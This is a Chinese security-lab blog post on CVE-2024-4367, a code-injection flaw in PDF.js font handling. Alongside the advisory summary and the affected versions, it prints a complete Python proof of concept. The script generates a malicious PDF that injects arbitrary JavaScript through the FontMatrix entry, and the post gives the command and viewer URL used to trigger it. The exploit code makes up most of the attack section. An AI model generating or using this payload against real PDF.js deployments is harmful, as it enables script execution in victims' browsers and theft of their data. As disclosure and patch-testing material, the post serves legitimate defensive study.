#  听说PDF.js插件漏洞很火？   
巢安实验室  巢安实验室   2024-05-23 21:50  
  
**0x00 前言**  
  
  
PDF.js 是一个使用 HTML5 构建的便携式文档格式查看器。  
pd  
f.js 是社区驱动的，并由 Mozilla 支持。  
我们的目标是为解析和呈现 PDF 创建一个通用的、基于 Web 标准的平台。  
  
**0x01 漏洞描述**  
  
在font_loader.js中存在代码注入漏洞，当PDF.js配置isEvalSupported选项设置为true(默认值)时会将输入传递到eval()函数，攻击者可通过诱导用户打开恶意PDF文件来利用漏洞，成功利用漏洞可以执行任意JavaScript。  
  
**0x02 CVE编号**  
  
CVE-2024-4367  
  
**0x03 影响版本**  
  
  
Mozilla PDF.js < 4.2.67  
  
pdfjs-dist(npm) < 4.2.67  
  
react-pdf(npm) < 7.7.3  
  
8.0.0 <= react-pdf(npm) < 8.0.2  
  
  
**0x04 漏洞详情**  
  
参见下方链接  
```
https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq
```  
  
**0x05 漏洞复现**  
  
**利用要求：**  
  
目标服务器是通过pdf.js插件打开pdf格式文件的，能传pdf到目标服务器，能找到上传的pdf路径，能通过pdf.js查看上传的pdf文件。  
  
**POC**  
```
import io
import sys

# CVE-2024-4367

def create_malicious_pdf(filename, payload):
    print("[*] POC Generated")
    pdf_content = f'''
%PDF-1.4
%
8 0 obj
<<
/PatternType 2
/Shading<<
  /Function<<
    /Domain[0 1]
    /C0[0 0 1]
    /C1[1 0.6 0]
    /N 1
    /FunctionType 2
  >>
  /ShadingType 2
  /Coords[46 400 537 400]
  /Extend[false false]
  /ColorSpace/DeviceRGB
>>
/Type/Pattern
>>
endobj
5 0 obj
<<
/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]
/Type/Font
/BaseFont/PAXEKO+SourceSansPro-Bold
/LastChar 102
/Encoding/WinAnsiEncoding
/FontMatrix [0.1 0 0 0.1 0 (1\); \n{payload}]
/Subtype/Type1
/FirstChar 65
/FontDescriptor 9 0 R
>>
endobj
2 0 obj
<<
/Kids[3 0 R]
/Type/Pages
/Count 1
>>
endobj
9 0 obj
<<
/Type/FontDescriptor
/ItalicAngle 0
/Ascent 751
/FontBBox[-6 -12 579 713]
/FontName/PAXEKO+SourceSansPro-Bold
/StemV 100
/CapHeight 713
/Flags 32
/FontFile3 10 0 R
/Descent -173
/MissingWidth 250
>>
endobj
6 0 obj
<<
/Length 128
>>
stream
47 379 489 230 re S
/Pattern cs
BT
  50 500 Td
  117 TL
  /F1 150 Tf
  /P1 scn
  (AbCdEf) Tj
  /P2 scn
  (AbCdEf) '
ET
endstream
endobj
3 0 obj
<<
/Type/Page
/Resources 4 0 R
/Contents 6 0 R
/Parent 2 0 R
/MediaBox[0 0 595.2756 841.8898]
>>
endobj
10 0 obj
<<
/Length 800
/Subtype/Type2
>>
stream

endstream
endobj
7 0 obj
<<
/PatternType 1
/Matrix[1 0 0 1 50 0]
/Length 58
/TilingType 1
/BBox[0 0 16 16]
/YStep 16
/PaintType 1
/Resources<<
>>
/XStep 16
>>
stream
0.65 g
0 0 16 16 re f
0.15 g
0 0 8 8 re f
8 8 8 8 re f
endstream
endobj
4 0 obj
<<
/Pattern<<
  /P1 7 0 R
  /P2 8 0 R
>>
/Font<<
  /F1 5 0 R
>>
>>
endobj
1 0 obj
<<
/Pages 2 0 R
/Type/Catalog
/OpenAction[3 0 R /Fit]
>>
endobj

xref
0 11
0000000000 65535 f 
0000002260 00000 n 
0000000522 00000 n 
0000000973 00000 n 
0000002178 00000 n 
0000000266 00000 n 
0000000794 00000 n 
0000001953 00000 n 
0000000015 00000 n 
0000000577 00000 n 
0000001085 00000 n 
trailer
<<
/ID[(w4f) (w4f)]
/Root 1 0 R
/Size 11
>>
startxref
2333
%%EOF
'''
    with io.FileIO(filename, "wb") as file:
        file.write(pdf_content.encode())

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('''Usage: python poc.py malicious.pdf "alert\('S4vvy')"''')
        sys.exit(1)
    filename = sys.argv[1]
    custom_payload = sys.argv[2]
    create_malicious_pdf(filename, custom_payload)
```  
  
**搭建PDF.js插件**  
  
****  
  
详情参见下方链接  
```
https://blog.csdn.net/meisnb/article/details/115183049
```  
  
**运行poc程序：**  
```
python poc.py test.pdf "alert\('xss')"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVy9I4sBNy2xvJqQVScrxNoD5Au6y7icOIfTqAXKX57Cs8uAnRVD6x7AKKHgMJ7kyhdqOxCzMYc5Olg/640?wx_fmt=png&from=appmsg "")  
  
****```
http://127.0.0.1/DPFjs/web/viewer.html?file=http://127.0.0.1/malicious.pdf
```  
  
****  
  
**0x06 参考链接**  
```
https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq
https://github.com/s4vvysec/CVE-2024-4367-POC
https://cloud.tencent.com/developer/article/2419680
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVzNPDEiadhLROCQUuMQyouq2OicjCbTSbk6ZLyzR1uHhPhJZLuZTFaM31tS5jvcDB3sfVsb9novFWeQ/640?wx_fmt=jpeg "")  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
